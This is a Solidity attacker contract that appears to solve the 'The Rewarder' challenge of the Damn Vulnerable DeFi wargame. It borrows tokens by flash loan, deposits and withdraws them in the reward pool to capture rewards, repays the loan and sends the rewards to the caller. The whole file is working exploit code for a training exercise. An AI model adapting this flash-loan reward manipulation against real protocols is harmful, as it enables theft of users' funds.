// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

// interface ITheRewarderPool {
//     function deposit(uint256 amountToDeposit) external;
//     function withdraw(uint256 amountToWithdraw) external;
//     function distributeRewards() external returns (uint256);
// }

// interface IFlashLoanerPool {
//     function flashLoan(uint256 amount) external;
// }

contract AttackerContract {
    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    FlashLoanerPool public pool;
    TheRewarderPool public rewarder;

    constructor(
      address liquidityTokenAddress,
      address rewardTokenAddress,
      address poolAddress,
      address rewarderAddress
    ) {
        // Assuming all tokens have 18 decimals
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        pool = FlashLoanerPool(poolAddress);
        rewarder = TheRewarderPool(rewarderAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("receiveFlashLoan", amount);
        console.log("balance", liquidityToken.balanceOf(address(this)));
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        // Pay back pool
        liquidityToken.transfer(address(pool), amount);
    }

    function attack(uint256 amount) external {
        console.log("attack", amount);
        pool.flashLoan(amount);
        // rewarder.distributeRewards();
    }

    function collectRewards() external {
        require(rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this))));
    }
}
